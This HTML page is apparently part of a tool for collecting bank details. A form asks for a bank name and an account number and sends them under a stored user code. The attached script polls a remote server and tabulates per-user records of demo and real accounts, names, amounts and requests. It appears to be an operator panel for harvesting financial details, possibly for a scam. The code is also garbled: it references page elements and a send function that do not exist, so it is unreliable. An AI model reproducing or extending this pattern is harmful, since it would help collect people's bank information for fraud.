<!DOCTYPE html>
<html>
<head>
    <title>Message Sender</title>
    <style>
        body { font-family: Arial; margin: 40px; }
        input { padding: 10px; width: 300px; font-size: 16px; }
        button { padding: 10px 20px; font-size: 16px; background: #007bff; color: white; border: none; cursor: pointer; }
        #status { margin-top: 10px; color: green; }
    </style>
</head>
<body>
    <h2>ðŸ“¤ Send Message</h2>
    <form id="form" method="post">
        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), azaName: this.value })" placeholder="Type your bank name here">
        <input type="text" name="message" onchange="sender({ userId: localStorage.getItem('code'), realAcc: this.value })" placeholder="Type your account here">
        <input type="submit" value="Send to Receiver">
    </form>
    
    <div id="status">Hey</div>

    <script>   
// MAIN CODE
        const messageDisplay = document.getElementById('messageDisplay');
        const userTemplate = messageDisplay.querySelector('.user');
        let lastMessageId = localStorage.getItem('lastId') || 0;
        let savedUsers = JSON.parse(localStorage.getItem('savedUsers')) || [];
        messageDisplay.children[0].remove();

		// Display Saved Infos
        function displaySavedUsers() {
             // Remove current display Users
            const existingUsers = messageDisplay.querySelectorAll('.user');
            existingUsers.forEach(user => user.remove());
            
          savedUsers.forEach((user, index) => {
              const usersClone = userTemplate.cloneNode(true);
              usersClone.querySelector('.status').classList.add(user.status);     
			  usersClone.querySelector('.userId').textContent = user.userId;
              usersClone.querySelector('.demoAcc').textContent = user.demoAcc;
			  usersClone.querySelector('.azaName').textContent = user.azaName;
              usersClone.querySelector('.realAcc').textContent = user.realAcc;
			  usersClone.querySelector('.name').textContent = user.name;
              usersClone.querySelector('.amount').textContent = user.amount;
              usersClone.querySelector('.request').textContent = user.request;
			  usersClone.querySelector('.update').textContent = user.update;
			  messageDisplay.appendChild(usersClone);
          });
        }

		// Clear All infos
		function toclear() {
			localStorage.removeItem('savedUsers');
			localStorage.clear();
			const existingUsers = messageDisplay.querySelectorAll('.user');
            existingUsers.forEach(user => user.remove());
			window.location.reload();
		}
		
		const clearBtn = document.getElementById('clearBtn');
		clearBtn.addEventListener('click', toclear);


        // Function to fetch new messages using long-polling
        async function fetchMessages() {
            try {
                const response = await fetch(`https://send-39yi.onrender.com/api/messages?lastMessageId=${lastMessageId}`);
                const newMessages = await response.json();

                if (newMessages.length > 0) {
                    extractMessages(newMessages);
                    // Update last message ID
                    lastMessageId = newMessages[newMessages.length - 1].id;
                    localStorage.setItem('lastId', lastMessageId);
                }
            } catch (error) {
                console.error('Error fetching messages:', error);
            } finally {
                // Immediately poll again
                setTimeout(fetchMessages, 100);
            }
        }

		// Extract New Messages, Save/Update
        function extractMessages(messages) {
            messages.forEach(message => {
                const newUserId = message.userId;
                const existing = savedUsers.find(user => user.userId.toLowerCase() === newUserId.toLowerCase());
                if (existing) {
					if(message.status){
						updateUserById(newUserId, 'status', message.status);
					}
					if(message.demoAcc){
						updateUserById(newUserId, 'demoAcc', message.demoAcc);
					}
					if(message.azaName){
						updateUserById(newUserId, 'azaName', message.azaName);
					}
					if(message.realAcc){
						updateUserById(newUserId, 'realAcc', message.realAcc);
					}
					if(message.name){
						updateUserById(newUserId, 'name', message.name);
					}
					if(message.amount){
						updateUserById(newUserId, 'amount', message.amount);
					}
					if(message.request){
						updateUserById(newUserId, 'request', message.request);
					}
					if(message.update){
						updateUserById(newUserId, 'update', message.update);
					}
                    
                    displaySavedUsers();
                } else {
                    savedUsers.push({
						status: message.status,
                        userId: newUserId,
                        demoAcc: message.demoAcc,
						azaName: message.azaName,
						realAcc: message.realAcc,
						name: message.name,
						amount: message.amount,
                        request: message.request,
						update: message.update
                    });
                    localStorage.setItem('savedUsers', JSON.stringify(savedUsers));
                    displaySavedUsers();
                }
            });
        }
        // UPDATOR using UserId
function updateUserById(id, property, value) {
  const itemIndex = savedUsers.findIndex(user => user.userId === id);
  if (itemIndex !== -1) {
    savedUsers[itemIndex][property] = value;
    localStorage.setItem('savedUsers', JSON.stringify(savedUsers));
  }
}
        
        // Start polling when page loads
        window.addEventListener('load', () => {
            // Choose one method:
            fetchMessages(); // Long-polling (more efficient)
            displaySavedUsers();
        });
    </script>
</body>
</html>
        
